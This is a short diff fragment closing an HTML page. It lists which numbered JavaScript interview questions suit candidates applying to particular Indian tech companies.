+> **Flipkart / Swiggy / Zomato / Meesho / CRED** — All of the above + design patterns (Q94–Q100), performance (Q101–Q110), and system design coding (LRU cache Q99, EventEmitter Q83, infinite scroll Q79).
+>
+> **Razorpay / PhonePe / Juspay / Freshworks** — Deep dives on everything + generators (Q42, Q93), proxy/reflect (Q86), web workers (Q106), WeakRef (Q90), and security (Q102).
+    </script>
+    <!--Combine debounce + API-->
+</body>
+</html>
